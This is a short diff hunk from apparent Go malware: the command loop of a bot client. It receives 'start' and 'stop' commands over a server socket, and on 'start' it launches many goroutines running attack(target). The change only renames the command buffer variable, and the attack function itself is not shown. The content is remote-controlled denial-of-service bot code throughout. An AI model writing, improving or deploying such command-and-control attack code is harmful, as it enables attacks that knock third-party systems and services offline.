@@ -28,16 +28,16 @@ func main() {
 
 	// infinite loop
 	for {
-		cmd := make([]byte, 1024)
-		receiveCommand(server_socket, &cmd)
-		cmd = bytes.Trim(cmd, "\x00")
-		if string(cmd) == "start" {
+		cmd_buf := make([]byte, 1024)
+		receiveCommand(server_socket, &cmd_buf)
+		cmd_buf = bytes.Trim(cmd_buf, "\x00")
+		if string(cmd_buf) == "start" {
 			fmt.Println("Executing attack...")
 			running = 1
 			for i := 0; i < NUM_THREADS; i++ {
 				go attack(target)
 			}
-		} else if string(cmd) == "stop" {
+		} else if string(cmd_buf) == "stop" {
 			fmt.Println("Stopping attack...")
 			threads.Wait()
 		}
